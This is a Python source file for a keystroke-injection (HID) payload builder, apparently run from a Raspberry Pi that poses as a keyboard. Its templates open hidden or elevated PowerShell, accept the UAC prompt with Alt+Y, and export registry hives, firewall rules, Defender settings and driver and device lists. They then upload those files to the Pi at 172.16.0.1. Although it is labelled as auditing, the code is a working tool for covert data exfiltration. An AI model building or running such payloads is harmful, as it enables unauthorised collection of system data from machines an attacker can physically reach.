"""
Payload builder for generating HID injection scripts.
Supports dynamic templates with variable substitution.
"""

from datetime import datetime
import json


class PayloadBuilder:
    """Builds executable HID payloads from templates"""
    
    def __init__(self):
        self.payloads = {}
        self._register_default_payloads()
    
    def _register_default_payloads(self):
        """Register built-in payload templates"""
        
        # System info collector
        self.payloads['sysinfo'] = {
            'name': 'System Information Collector',
            'description': 'Collects Windows system information',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell -WindowStyle Hidden'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption};'},
                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}/check" -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Compliance check payload
        self.payloads['compliance'] = {
            'name': 'Compliance Check',
            'description': 'Checks security compliance and reports',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell -WindowStyle Hidden'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': '$fw=(Get-NetFirewallProfile -Profile Domain).Enabled;'},
                {'action': 'type', 'text': '$av=(Get-MpComputerStatus).AntivirusEnabled;'},
                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;firewall_enabled=$fw;antivirus_updated=$av;timestamp="{{TIMESTAMP}}"};'},
                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}/check" -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Simple test payload
        self.payloads['test'] = {
            'name': 'Test Payload',
            'description': 'Opens notepad with test message',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 400},
                {'action': 'type', 'text': 'notepad'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'Security Audit - {{TIMESTAMP}}'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'type', 'text': 'Host: {{HOST_ID}}'},
            ]
        }
        
        # Registry export - Policies (Works on Home)
        self.payloads['export_policies'] = {
            'name': 'Export Registry Policies',
            'description': 'Exports HKLM Policies and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKLM_Policies.reg -Headers @{"X-Filename"="HKLM_Policies.reg"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        self.payloads['export_user_policies'] = {
            'name': 'Export User Policies',
            'description': 'Exports HKCU Policies and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKCU_Policies.reg -Headers @{"X-Filename"="HKCU_Policies.reg"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Registry export - Services (Works on Home)
        self.payloads['export_services'] = {
            'name': 'Export Services Registry',
            'description': 'Exports Services and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\Services.reg -Headers @{"X-Filename"="Services.reg"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Registry export - Control (Works on Home)
        self.payloads['export_control'] = {
            'name': 'Export Control Registry',
            'description': 'Exports Control and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\Control.reg -Headers @{"X-Filename"="Control.reg"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Firewall export (Works on Home)
        self.payloads['export_firewall'] = {
            'name': 'Export Firewall Config',
            'description': 'Exports firewall and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw;'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\firewall.wfw -Headers @{"X-Filename"="firewall.wfw"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Defender settings (Works on Home)
        self.payloads['export_defender'] = {
            'name': 'Export Defender Settings',
            'description': 'Exports Defender and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'Get-MpPreference|ConvertTo-Json -Depth 5>C:\\defender.json;'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\defender.json -Headers @{"X-Filename"="defender.json"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Driver enumeration (Works on Home)
        self.payloads['export_drivers'] = {
            'name': 'Export Driver List',
            'description': 'Exports drivers and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'pnputil /enum-drivers>C:\\drivers.txt;Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\drivers.txt -Headers @{"X-Filename"="drivers.txt"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Device enumeration (Works on Home)
        self.payloads['export_devices'] = {
            'name': 'Export Device List',
            'description': 'Exports devices and uploads to Pi',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'pnputil /enum-devices>C:\\devices.txt;'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\devices.txt -Headers @{"X-Filename"="devices.txt"} -UseBasicParsing'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Combined audit (All Home-compatible commands)
        self.payloads['full_audit'] = {
            'name': 'Full System Audit',
            'description': 'Runs all Home-compatible exports (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw;'},
                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 > C:\\defender.json;'},
                {'action': 'type', 'text': 'pnputil /enum-drivers > C:\\drivers.txt;'},
                {'action': 'type', 'text': 'pnputil /enum-devices > C:\\devices.txt'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 8000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Full audit with auto-upload
        self.payloads['audit_and_upload'] = {
            'name': 'Audit and Upload',
            'description': 'Exports all data and uploads to Pi automatically',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw;'},
                {'action': 'type', 'text': 'Get-MpPreference|ConvertTo-Json -Depth 5>C:\\defender.json;'},
                {'action': 'type', 'text': 'pnputil /enum-drivers>C:\\drivers.txt;'},
                {'action': 'type', 'text': 'pnputil /enum-devices>C:\\devices.txt;'},
                {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall.wfw","defender.json","drivers.txt","devices.txt");'},
                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://172.16.0.1:8000" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 10000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Upload audit files to Pi
        self.payloads['upload_files'] = {
            'name': 'Upload Audit Files',
            'description': 'Uploads all audit files to Pi (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall.wfw","defender.json","drivers.txt","devices.txt");'},
                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){'},
                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://172.16.0.1:8000" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing'},
                {'action': 'type', 'text': '}}'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 5000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
    
    def get_payload(self, name, variables=None):
        """
        Get payload by name with variable substitution.
        
        Args:
            name: Payload name
            variables: Dict of variables to substitute
        
        Returns:
            List of commands with substituted variables
        """
        if name not in self.payloads:
            raise ValueError(f"Payload '{name}' not found")
        
        payload = self.payloads[name].copy()
        commands = payload['commands']
        
        # Default variables
        default_vars = {
            'TIMESTAMP': datetime.now().isoformat(),
            'HOST_ID': 'unknown',
            'SERVER_IP': '172.16.0.1',
        }
        
        # Merge with provided variables
        if variables:
            default_vars.update(variables)
        
        # Substitute variables in commands
        substituted = []
        for cmd in commands:
            new_cmd = cmd.copy()
            if 'text' in new_cmd:
                text = new_cmd['text']
                for var, value in default_vars.items():
                    text = text.replace(f'{{{{{var}}}}}', str(value))
                new_cmd['text'] = text
            substituted.append(new_cmd)
        
        return substituted
    
    def list_payloads(self):
        """List all available payloads"""
        return {
            name: {
                'name': payload['name'],
                'description': payload['description']
            }
            for name, payload in self.payloads.items()
        }
    
    def add_custom_payload(self, name, description, commands):
        """
        Add a custom payload.
        
        Args:
            name: Unique payload identifier
            description: Human-readable description
            commands: List of command dictionaries
        """
        self.payloads[name] = {
            'name': name,
            'description': description,
            'commands': commands
        }
